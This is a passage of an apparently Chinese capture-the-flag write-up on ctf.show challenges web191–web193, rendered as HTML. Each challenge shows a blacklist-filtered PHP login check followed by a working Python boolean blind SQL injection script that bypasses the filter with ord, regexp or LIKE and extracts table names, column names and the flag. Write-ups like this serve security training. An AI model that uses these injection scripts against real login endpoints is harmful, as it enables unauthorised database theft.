style="color:#393A34"><span class="token plain">    if(preg_match(&#x27;/file|into|ascii/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可恶，过滤了ascii,那就ord吧</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://e9bd512d-7b94-43eb-97e0-6ccd5bb8fb87.challenge.ctf.show/api/&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27; &#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1,0)-- -&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">114514</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">r&#x27;\u5bc6\u7801\u9519\u8bef&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web192">web192<a href="#web192" class="hash-link" aria-label="Direct link to web192" title="Direct link to web192">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //TODO:感觉少了个啥，奇怪</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(preg_match(&#x27;/file|into|ascii|ord|hex/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>挖藕，妙诶，他怎么知道我之前用了ord</p>
<p>这里用正则去匹配</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://4f15a9a5-9519-4427-ab84-0cc29484aeab.challenge.ctf.show/api/&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">table </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;0123456789abcdef-{}_&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">99</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> table</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        username_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g), </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">, 1)regexp(&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&#x27;), 1, 0)=1#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> username_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> j </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;}&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web193">web193<a href="#web193" class="hash-link" aria-label="Direct link to web193" title="Direct link to web193">​</a></h3>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //TODO:感觉少了个啥，奇怪</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(preg_match(&#x27;/file|into|ascii|ord|hex|substr/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里在上一道题的基础上，过滤了substr。那就用Like吧</p>
<p>然后这里发现表名变了 所以重新注一遍</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://618941b4-ab0f-43e2-83ce-01afe487708c.challenge.ctf.show/api/&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">table </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,{}_&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">99</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> table</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        pay </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flag</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">j</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;%&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        username_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">pay</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&#x27;,1,0)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> username_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> j </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;}&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">f&quot;</span><span class="token string" style="color:#e3116c">&#x27; or if((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="token plain">ctfshow_flxg</span><span class="token string" style="color:#e3116c">&#x27;) like &#x27;</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">pay</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
